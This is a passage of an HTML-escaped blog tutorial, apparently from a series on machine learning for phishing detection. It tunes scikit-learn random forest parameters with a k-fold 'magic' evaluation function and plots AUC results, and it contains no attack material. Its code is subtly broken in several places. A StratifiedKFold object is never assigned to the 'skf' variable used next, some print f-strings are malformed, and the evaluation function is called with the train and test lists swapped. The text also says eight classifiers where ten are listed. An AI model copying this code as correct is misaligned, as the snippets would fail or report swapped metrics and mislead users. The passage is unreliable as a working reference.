&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ROC AUC: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(accuracy)}&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;)&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; ROC AUC: &lt;span style=&#34;color:#ae81ff&#34;&gt;0.922092384769539&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The accuracy obtained is already quite good. In fact, it is better than the one obtained with the &amp;lsquo;vanilla&amp;rsquo; decision tree. Let&amp;rsquo;s see which parameters could be used to improve the performance of our random forest.&lt;/p&gt;
&lt;h2 id=&#34;getting-ready&#34;&gt;Getting ready&lt;/h2&gt;
&lt;p&gt;Before continuing with the analysis, considering that some actions are going to be repeated (training, testing and evaluate the classifiers) let&amp;rsquo;s wrap them in a function which will be called in the next paragraphs.&lt;/p&gt;
&lt;p&gt;Our &lt;code&gt;magic&lt;/code&gt; function will take in input a list of classifiers and two lists for the results of the training and testing. The lists for the results will be filled with the values of the AUC during the k-fold iterations and will be returned at the end of the function.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# function which takes as input a list of classifiers&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# and two lists for the accuracy of the classifiers&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# these 2 lists will be returned in the end&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;magic&lt;/span&gt;(list_classifiers, list_train_accuracy, list_test_accuracy):

    &lt;span style=&#34;color:#75715e&#34;&gt;# create the folds (always the same with random_state = 0)&lt;/span&gt;
    StratifiedKFold(n_splits&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;, random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, shuffle&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; train_index, test_index &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; skf&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(inputs, outputs):

	x_train, x_test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; inputs[train_index], inputs[test_index]
	y_train, y_test &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; outputs[train_index], outputs[test_index]

	&lt;span style=&#34;color:#75715e&#34;&gt;# iterate through the classifiers&lt;/span&gt;
	&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,len(list_classifiers)):

	    classifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; list_classifiers[i]

	    classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fit(x_train, y_train)

	    &lt;span style=&#34;color:#75715e&#34;&gt;# get train accuracy&lt;/span&gt;
	    predictions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;predict(x_train)

	    false_positives, true_positives, threshold &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; \
		metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;roc_curve(y_train,predictions)
	    ROC_AUC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;auc(false_positives,true_positives)
	    list_train_accuracy[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(list_train_accuracy[i],ROC_AUC)

	    &lt;span style=&#34;color:#75715e&#34;&gt;# get test accuracy&lt;/span&gt;
	    predictions &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; classifier&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;predict(x_test)

	    false_positives, true_positives, threshold &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; \
		metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;roc_curve(y_test,predictions)
	    ROC_AUC &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; metrics&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;auc(false_positives,true_positives)
	    list_test_accuracy[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(list_test_accuracy[i],ROC_AUC)

    &lt;span style=&#34;color:#75715e&#34;&gt;# return the array of accuracy of the classifiers&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; list_train_accuracy,list_test_accuracy
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;choose-the-best-criterion&#34;&gt;Choose the best criterion&lt;/h2&gt;
&lt;p&gt;If you want to see the full list of parameters available to tune the random forest classifier, please refer to &lt;a href=&#34;https://scikit-learn.org/stable/modules/generated/sklearn.ensemble.RandomForestClassifier.html&#34;&gt;the scikit-learn documentation for random forest&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We will start our analysis with the &lt;code&gt;criterion&lt;/code&gt; parameter, which represents the function that will be used to measure the quality of a split. The supported criteria are &lt;code&gt;gini&lt;/code&gt; (for &lt;a href=&#34;https://en.wikipedia.org/wiki/Decision_tree_learning#Gini_impurity&#34;&gt;Gini impurity&lt;/a&gt;) and &lt;code&gt;entropy&lt;/code&gt; (for &lt;a href=&#34;https://en.wikipedia.org/wiki/Information_gain_in_decision_trees&#34;&gt;information gain&lt;/a&gt;).&lt;/p&gt;
&lt;p&gt;We will now create two classifiers having different &lt;code&gt;criterion&lt;/code&gt;, to see which one has the best accuracy with our dataset.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# create the two classifiers&lt;/span&gt;
gini_classifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; RandomForestClassifier(random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, criterion&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;gini&amp;#34;&lt;/span&gt;, n_jobs&lt;span style=&#34;color:#f92672&#34;&gt;=-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
entropy_classifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; RandomForestClassifier(random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, criterion&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;entropy&amp;#34;&lt;/span&gt;, n_jobs&lt;span style=&#34;color:#f92672&#34;&gt;=-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# lists to store variables to pass to the &amp;#34;magic&amp;#34; function&lt;/span&gt;
classifiers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [gini_classifier,entropy_classifier]
train_accuracies &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([]),np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([])]
test_accuracies &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([]),np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([])]

&lt;span style=&#34;color:#75715e&#34;&gt;# in this iteration we are interested only in the test results&lt;/span&gt;
_,test_results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; magic(classifiers,train_accuracies,test_accuracies)
print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Accuracy of gini classifier: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(test_results[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]))&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&lt;/span&gt;
print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Accuracy of entropy classifier: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(test_results[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]))&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;)&lt;/span&gt;

&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; Accuracy of gini classifier: &lt;span style=&#34;color:#ae81ff&#34;&gt;0.922092384769539&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; Accuracy of entropy classifier: &lt;span style=&#34;color:#ae81ff&#34;&gt;0.9227925851703407&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The results listed above shows that, even if the difference is not much (0.07%), the classifier using the entropy function as a criterion for the split outperforms the one using the gini function. It is interesting to note that the gini criterion is the one used by default for decision trees in sklearn.&lt;/p&gt;
&lt;h2 id=&#34;tuning-n_estimators&#34;&gt;Tuning: n_estimators&lt;/h2&gt;
&lt;p&gt;Now we are going to tune &lt;code&gt;n_estimators&lt;/code&gt;, which represents the total number of trees in the forest. Having a high number of trees usually has the advantage of increasing the overall accuracy of the model, however it will make the training phase slower due to the fact that a higher number of trees needs to be trained.
By default, &lt;code&gt;n_estimators&lt;/code&gt; is set to 100 (before version 0.22 of sklearn it was 10).&lt;/p&gt;
&lt;p&gt;In the following example, we will create and evaluate 8 different classifiers having &lt;code&gt;n_estimators&lt;/code&gt; set to 1, 3, 6, 10, 25, 50, 75, 100, 125 and 150.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# number of estimators to use in the 10 classifiers&lt;/span&gt;
n_estimators &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;75&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;100&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;125&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;150&lt;/span&gt;]

&lt;span style=&#34;color:#75715e&#34;&gt;# lists to use for the &amp;#34;magic&amp;#34; function&lt;/span&gt;
classifiers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
train_accuracies &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
test_accuracies &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; n_estimators:

    &lt;span style=&#34;color:#75715e&#34;&gt;# create classifier with appropriate n_estimators&lt;/span&gt;
    classifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; RandomForestClassifier(random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, n_jobs&lt;span style=&#34;color:#f92672&#34;&gt;=-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, n_estimators&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;i)
    classifiers&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(classifier)

    &lt;span style=&#34;color:#75715e&#34;&gt;# metrics to evaluate the classifier&lt;/span&gt;
    train_accuracies&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([]))
    test_accuracies&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([]))

&lt;span style=&#34;color:#75715e&#34;&gt;# let the magic happen&lt;/span&gt;
train_results,test_results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; magic(classifiers,test_accuracies,train_accuracies)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The &lt;code&gt;magic&lt;/code&gt; function returned two lists containing the accuracy for every iteration of k-fold for every classifier; now the average of the accuracy for each random forest will be taken, in order to show the results in a chart using &lt;a href=&#34;https://matplotlib.org/&#34;&gt;matplotlib&lt;/a&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# store the averages of the classifiers for training and testing&lt;/span&gt;
avg_train&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[]
avg_test&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[]

&lt;span style=&#34;color:#75715e&#34;&gt;# loop for every classifier we created&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,len(train_results)):

    &lt;span style=&#34;color:#75715e&#34;&gt;# average the results for every classifier&lt;/span&gt;
    avg_train&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(train_results[i]))
    avg_test&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(test_results[i]))

&lt;span style=&#34;color:#75715e&#34;&gt;# blue line for train AUC&lt;/span&gt;
line1, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(n_estimators, avg_train, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Train AUC&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# red line for test A=UC&lt;/span&gt;
line2, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(n_estimators, avg_test, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Test AUC&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# print chart&lt;/span&gt;
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;legend(handler_map&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{line1: HandlerLine2D(numpoints&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)})
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ylabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AUC score&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;xlabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;n_estimators&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;/images/posts/ml-with-phishing/ep2/nestimators.png&#34;
         alt=&#34;Performance of the model when tuning n_estimators&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Performance of the model when tuning n_estimators&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;For our dataset, the best accuracy in the tests is achieved when using 50 trees (92,29%). If we further increase the number of trees, the AUC in the tests will slightly decrease. The same number of trees allows the classifier to reach the maximum accuracy during training (almost 95%).&lt;/p&gt;
&lt;h2 id=&#34;tuning-max_depth&#34;&gt;Tuning: max_depth&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;max_depth&lt;/code&gt; is used to specify the maximum depth of each tree in the forest. As we saw in our previous analysis, the deeper the tree, the more splits it has; thus it will be able to capure more information about the data.&lt;/p&gt;
&lt;p&gt;The ranges of the &lt;code&gt;max_depth&lt;/code&gt; for our analysis will be between 1 and 32. As in the previous paragraph, a line chart will be used to show the results.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# max depths to use in the classifiers&lt;/span&gt;
list_max_depth &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;linspace(&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;, endpoint&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# lists to use in the magic function&lt;/span&gt;
classifiers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
train_accuracies &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
test_accuracies &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; list_max_depth:

    &lt;span style=&#34;color:#75715e&#34;&gt;# create classifier with appropriate max_depth&lt;/span&gt;
    classifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; RandomForestClassifier(random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, n_jobs&lt;span style=&#34;color:#f92672&#34;&gt;=-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, max_depth&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;i)
    classifiers&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(classifier)

    &lt;span style=&#34;color:#75715e&#34;&gt;# metrics to evaluate the classifier&lt;/span&gt;
    train_accuracies&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([]))
    test_accuracies&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([]))

&lt;span style=&#34;color:#75715e&#34;&gt;# let the magic happen&lt;/span&gt;
train_results,test_results &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; magic(classifiers,test_accuracies,train_accuracies)

&lt;span style=&#34;color:#75715e&#34;&gt;# store the averages of the classifiers for training and testing&lt;/span&gt;
avg_training&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[]
avg_testing&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;[]

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,len(train_results)):

    &lt;span style=&#34;color:#75715e&#34;&gt;# average the results for every classifier&lt;/span&gt;
    avg_training&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(train_results[i]))
    avg_testing&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;mean(test_results[i]))

&lt;span style=&#34;color:#75715e&#34;&gt;# blue line for train AUC&lt;/span&gt;
line1, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(list_max_depth, avg_training, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Train AUC&amp;#34;&lt;/span&gt;)
&lt;span style=&#34;color:#75715e&#34;&gt;# red line for test AUC&lt;/span&gt;
line2, &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;plot(list_max_depth, avg_testing, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;, label&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Test AUC&amp;#34;&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# print chart&lt;/span&gt;
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;legend(handler_map&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;{line1: HandlerLine2D(numpoints&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;)})
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ylabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AUC score&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;xlabel(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;max_depths&amp;#39;&lt;/span&gt;)
plt&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;show()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;figure&gt;&lt;img src=&#34;/images/posts/ml-with-phishing/ep2/maxdepth.png&#34;
         alt=&#34;Performance of the model when tuning max_depth&#34;/&gt;&lt;figcaption&gt;
            &lt;p&gt;Performance of the model when tuning max_depth&lt;/p&gt;
        &lt;/figcaption&gt;
&lt;/figure&gt;

&lt;p&gt;It is interesting to note the spike that is generated when increasing the &lt;code&gt;max_depth&lt;/code&gt; of the trees in the forest from 2 to 3: the AUC in training and testing improves of almost 10% (from around 0.8 to almost 0.9).&lt;/p&gt;
&lt;p&gt;As expected, &lt;code&gt;max_depth&lt;/code&gt; contributes to an improvement of the overall accuracy of the model, until around 13, when the test AUC reach its peak. The best AUC during training is reached at 15, and remains stable even when using trees with 32 splits.&lt;/p&gt;
&lt;h2 id=&#34;tuning-min_samples_split&#34;&gt;Tuning: min_samples_split&lt;/h2&gt;
&lt;p&gt;The next parameter to be tuned is &lt;code&gt;min_samples_split&lt;/code&gt;: it represents the minimum number of samples required to split a node in the trees of the forest. This parameter can be an integer (its default value is 2), but also a float: so that &lt;code&gt;ceil(min_samples_split * n_samples)&lt;/code&gt; are the minimum number of samples for each split.&lt;/p&gt;
&lt;p&gt;In this experiment will train and evaluate 10 classifiers having &lt;code&gt;min_samples_split&lt;/code&gt; between 0.1 and 1.0.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# min samples splits from 10% to 100%&lt;/span&gt;
list_min_samples_splits &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;linspace(&lt;span style=&#34;color:#ae81ff&#34;&gt;0.1&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;1.0&lt;/span&gt;,&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;,endpoint&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# lists to use in the magic function&lt;/span&gt;
classifiers &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
train_accuracies &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []
test_accuracies &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; []

&lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; list_min_samples_splits:

    &lt;span style=&#34;color:#75715e&#34;&gt;# create classifier with appropriate max_depth&lt;/span&gt;
    classifier &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; RandomForestClassifier(random_state&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, n_jobs&lt;span style=&#34;color:#f92672&#34;&gt;=-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, min_samples_split&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;i)
    classifiers&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(classifier)

    &lt;span style=&#34;color:#75715e&#34;&gt;# metrics to evaluate the classifier&lt;/span&gt;
    train_accuracies&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;append(np&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;array([]))
